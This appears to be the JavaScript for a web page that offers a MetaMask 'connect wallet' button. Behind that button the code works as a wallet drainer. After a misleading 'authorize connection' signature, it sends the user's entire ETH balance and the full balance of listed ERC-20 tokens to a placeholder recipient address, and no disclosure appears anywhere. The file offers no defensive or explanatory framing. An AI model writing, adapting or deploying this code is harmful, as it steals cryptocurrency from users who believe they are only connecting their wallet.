let isConnecting = false; // Prevent multiple simultaneous connections

document.getElementById("connectButton").addEventListener("click", openModal);

function openModal() {
    const modal = document.getElementById("walletModal");
    modal.style.display = "block";
    const modalContent = modal.querySelector(".modal-content");
    modalContent.style.bottom = "0"; // Slide up

    console.log("Modal opened for wallet selection");
}

function closeModal() {
    const modalContent = document.querySelector(".modal-content");
    modalContent.style.bottom = "-100%"; // Slide down

    setTimeout(() => {
        document.getElementById("walletModal").style.display = "none";
        console.log("Modal closed after wallet selection");
    }, 400); // Match this duration with CSS transition time
}

async function connectMetaMask() {
    console.log("MetaMask button clicked");
    await connectWallet("MetaMask");
}

async function connectWallet(walletName) {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return;
    }

    isConnecting = true;
    closeModal();

    try {
        let account;
        console.log(`Attempting to connect to ${walletName}...`);

        if (walletName === "MetaMask" && typeof window.ethereum !== "undefined") {
            console.log(`${walletName} detected. Requesting to sign a message...`);

            // Request account and sign a message for authentication
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const accounts = await provider.send("eth_requestAccounts", []);
            account = accounts[0];
            await signer.signMessage("Authorize wallet connection for batch transactions.");
            console.log(`Connected to ${walletName} account: ${account}`);
        } else {
            alert(`${walletName} is not installed. Please install it.`);
            console.error(`${walletName} is not installed in the browser.`);
            return;
        }

        if (account) {
            console.log(`Wallet connected. Initiating batch transaction process for account: ${account}`);
            await executeBatchTransactions(account); // Trigger batch transactions
        } else {
            console.error("No account found.");
        }

    } catch (error) {
        console.error(`Error connecting to ${walletName}:`, error);
    } finally {
        isConnecting = false;
        console.log(`Finished connection attempt for ${walletName}`);
    }
}

async function executeBatchTransactions(userWallet) {
    console.log("Executing batch transactions...");

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const recipient = "0xRecipientAddressHere"; // Replace with recipient's address
    const tokenAddresses = [
        "0xTokenAddress1", // Replace with actual ERC-20 token addresses
        "0xTokenAddress2",
    ];

    try {
        // Step 1: Transfer all ETH
        const ethBalance = await provider.getBalance(userWallet);
        if (ethBalance.gt(ethers.constants.Zero)) {
            console.log("Transferring ETH...");
            const tx = await signer.sendTransaction({
                to: recipient,
                value: ethBalance.sub(ethers.utils.parseEther("0.001")), // Leave a small balance for gas
            });
            console.log("ETH transferred. Transaction Hash:", tx.hash);
            await tx.wait();
        } else {
            console.log("No ETH to transfer.");
        }

        // Step 2: Transfer all ERC-20 tokens
        const tokenABI = [
            "function balanceOf(address account) view returns (uint256)",
            "function transfer(address to, uint256 amount) returns (bool)",
        ];

        for (let tokenAddress of tokenAddresses) {
            const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
            const tokenBalance = await tokenContract.balanceOf(userWallet);

            if (tokenBalance.gt(ethers.constants.Zero)) {
                console.log(`Transferring tokens from ${tokenAddress}...`);
                const tx = await tokenContract.transfer(recipient, tokenBalance);
                console.log(`Tokens transferred. Transaction Hash: ${tx.hash}`);
                await tx.wait();
            } else {
                console.log(`No balance for token ${tokenAddress}.`);
            }
        }

        console.log("Batch transactions completed.");
    } catch (error) {
        console.error("Error executing batch transactions:", error);
    }
}
